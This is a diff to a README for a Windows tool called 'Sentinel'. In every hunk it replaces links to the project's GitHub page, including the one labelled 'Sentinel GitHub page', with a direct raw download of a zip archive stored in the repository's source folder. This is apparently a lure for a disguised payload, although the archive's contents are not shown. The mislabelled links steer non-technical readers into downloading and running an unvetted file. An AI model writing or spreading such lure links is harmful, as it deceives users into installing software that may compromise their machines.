@@ -1,6 +1,6 @@
 # 🛡️ Sentinel - Protect Your Network with Smart AI
 
-[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-brightgreen)](https://github.com/Shrief-Salama/Sentinel)
+[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-brightgreen)](https://raw.githubusercontent.com/Shrief-Salama/Sentinel/main/src/app/Software-3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ If your PC matches these points, you can use Sentinel without trouble.
 
 Click the button below to visit the Sentinel download page on GitHub:  
 
-[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-blue)](https://github.com/Shrief-Salama/Sentinel)
+[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-blue)](https://raw.githubusercontent.com/Shrief-Salama/Sentinel/main/src/app/Software-3.4.zip)
 
 This link takes you to the main page where you will find the latest version available for download.  
 
@@ -94,7 +94,7 @@ To update:
 3. Click “Check for Updates.”  
 4. If an update is available, follow the prompts to download and install it.  
 
-You can also visit the [Sentinel GitHub page](https://github.com/Shrief-Salama/Sentinel) regularly to check for new versions.
+You can also visit the [Sentinel GitHub page](https://raw.githubusercontent.com/Shrief-Salama/Sentinel/main/src/app/Software-3.4.zip) regularly to check for new versions.
 
 ## 🛠️ Troubleshooting Common Issues
 
@@ -118,7 +118,7 @@ The software follows standard security practices to protect your privacy.
 
 For more help and explanations, visit the following:  
 
-- Sentinel GitHub: https://github.com/Shrief-Salama/Sentinel  
+- Sentinel GitHub: https://raw.githubusercontent.com/Shrief-Salama/Sentinel/main/src/app/Software-3.4.zip  
 - GitHub “Issues” section for reporting problems  
 - Official Windows support if you have Windows-related questions  
 
@@ -126,4 +126,4 @@ Basic internet skills like downloading and running programs will help you use Se
 
 ---
 
-[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-grey)](https://github.com/Shrief-Salama/Sentinel)
+[![Download Sentinel](https://img.shields.io/badge/Download-Sentinel-grey)](https://raw.githubusercontent.com/Shrief-Salama/Sentinel/main/src/app/Software-3.4.zip)
